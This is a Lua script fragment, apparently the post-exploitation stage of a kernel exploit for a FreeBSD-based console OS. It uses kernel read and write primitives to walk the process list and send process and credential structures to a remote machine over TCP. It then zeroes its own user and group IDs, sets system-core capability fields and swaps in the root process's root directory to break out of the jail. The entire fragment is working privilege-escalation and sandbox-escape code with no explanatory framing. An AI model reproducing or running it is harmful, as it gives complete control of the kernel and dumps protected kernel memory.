dump_base = 'proc_dump_3.00/'
tcp_file_write(dump_base..'kthread.bin', kr4k(kthread))

kproc = kr64(kthread + 8)
self_kproc = kproc

root_kproc = nil
while true do
    local pid = kr64(kproc + 0xbc).lo
    if pid == 0 then
        root_kproc = kproc
    end
    tcp_file_write(string.format(dump_base..'pid_%04x_proc.bin', pid), kr4k(kproc))
    log('kproc '..tostring(kproc))
    local kcred = kr64(kproc + 0x40)
    tcp_file_write(string.format(dump_base..'pid_%04x_ucred.bin', pid), kr4k(kcred))

    kproc = kr64(kproc)
    if kproc:is_zero() then
        log("empty")
        break
    end
    if kproc == self_kproc then
        log("done")
        break
    end
end

--error('done')

if root_kproc then
    log("breaking out of jail")
    local zero = Uint64:new(0)

    -- ucred
    self_p_ucred = kr64(self_kproc + 0x40)
    -- cr_uid = cr_ruid = cr_svuid = cr_rgid = cr_svgid = 0
    -- cr_ngroups = 1
    kw64(self_p_ucred + 0x04, zero)
    kw64(self_p_ucred + 0x0c, Uint64:new(0, 1))
    kw64(self_p_ucred + 0x14, zero)
    -- cr_smallgroups[:2] = 0
    kw64(self_p_ucred + 0x124, zero)
    -- set SceSysCore sce_ucred info TODO too lazy to do kmemcpy
    syscore_ucred = string.fromhex('100000000000004800000000001C004000FF000000000090000000000000000000000000000000000000008000400040000000000000008000000000000000080040FFFF000000F0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000')
    kw64(self_p_ucred + 0x58, Uint64:new(0x0000001e, 0x48000000))
    kw64(self_p_ucred + 0x60, Uint64:new(0x00000000, 0x40001c00))

    -- self_cr_groups[:2] = 0
    local self_cr_groups = kr64(self_p_ucred + 0x118)
    kw64(self_cr_groups, zero)

    -- filedesc
    self_p_fd = kr64(self_kproc + 0x48)
    root_p_fd = kr64(root_kproc + 0x48)
    root_fd_rdir = kr64(root_p_fd + 0x10)
    -- write fd_rdir
    kw64(self_p_fd + 0x10, root_fd_rdir)
    -- write fd_jdir (fd_jdir is set on us, dont think modifying it really grants anything...)
    kw64(self_p_fd + 0x18, zero)

    log("FIXED")
end
